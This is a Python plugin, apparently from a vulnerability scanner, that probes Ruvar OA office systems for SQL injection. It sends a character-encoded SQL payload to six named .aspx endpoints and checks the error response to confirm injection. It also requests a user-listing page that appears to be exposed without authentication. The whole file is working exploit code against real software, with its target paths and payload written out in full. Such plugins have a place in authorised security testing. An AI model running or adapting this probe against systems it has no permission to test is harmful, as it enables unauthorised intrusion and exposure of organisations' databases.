#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import requests
import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "RuvarOA_multi_sqli"  # 插件名称
        self.info['name'] ='璐华OA系统SQL注入漏洞' #漏洞名称
        self.info['affects'] = "璐华OA"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "ChAr(71)%2BChAr(81)%2BChAr(88)%2B@@VeRsIoN"
urls = ["/flow/flow_get_if_value.aspx?template_id=",
        "/include/get_dict.aspx?bt_id=",
        "/LHMail/email_attach_delete.aspx?attach_id=",
        "/OnlineChat/chat_show.aspx?id=",
        "/OnlineChat/chatroom_show.aspx?id=",
        "/OnlineReport/get_condiction.aspx?t_id="]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for turl in urls:
            payload_url = scheme+"://"+url+turl+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if code==500 and con.lower().find('gqxmicrosoft')!=-1:
                Medusa = "{}存在璐华OA系统SQL注入漏洞 \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
                _t = VulnerabilityInfo(Medusa)
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
    except:
            logging.warning(Url)
            _ = VulnerabilityInfo('')
            logging.warning(_.info.get('parameter'))
    try:

        payload_url = scheme+"://"+url+ ':' + str(port)+"/include/get_user.aspx"
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('button_normal')!=-1:
            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            Medusas.append(str(Medusa))
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危

    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
    Medusas_str = ''
    for i in Medusas:
        Medusas_str = Medusas_str + i
    return (str(Medusas_str))
